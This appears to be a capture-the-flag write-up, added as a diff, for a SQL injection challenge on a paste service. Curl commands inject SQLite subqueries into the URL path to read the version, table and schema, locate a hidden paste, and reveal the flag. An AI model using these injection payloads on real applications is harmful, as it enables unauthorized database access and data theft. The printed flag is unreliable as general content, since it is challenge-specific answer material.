@@ -1,0 +1,26 @@
+MySQL payload => not worked
+
+SQLite
+
+# Version
+curl -X GET "http://chall.bsidesalgiers.com:8001/paste/a025n1y7/(select%20sqlite_version())"
+	3.27.2
+
+# Table name
+curl -X GET "http://chall.bsidesalgiers.com:8001/paste/a025n1y7/(select%20name%20FROM%20sqlite_master%20WHERE%20type='table')"
+	pastes
+
+# Column name
+curl -X GET "http://chall.bsidesalgiers.com:8001/paste/a025n1y7/(SELECT%20sql%20FROM%20sqlite_master%20WHERE%20type!='meta'%20AND%20sql%20NOT%20NULL%20AND%20name%20='pastes')"
+	CREATE TABLE pastes (
+                        id text,
+                        title text,
+                        text text
+                    )
+
+# Find id of pastes contains 'shellmates' in text
+curl -X GET "http://chall.bsidesalgiers.com:8001/paste/a025n1y7/(select%20id%20from%20pastes%20WHERE%20text%20like%20'%shellmates%')"
+	sp05m8vu
+
+curl -X GET "http://chall.bsidesalgiers.com:8001/paste/sp05m8vu"
+	shellmates{2021_y3t_sQl_1nj3ct10ns_4r3_st1ll_4_pr0bl3m}
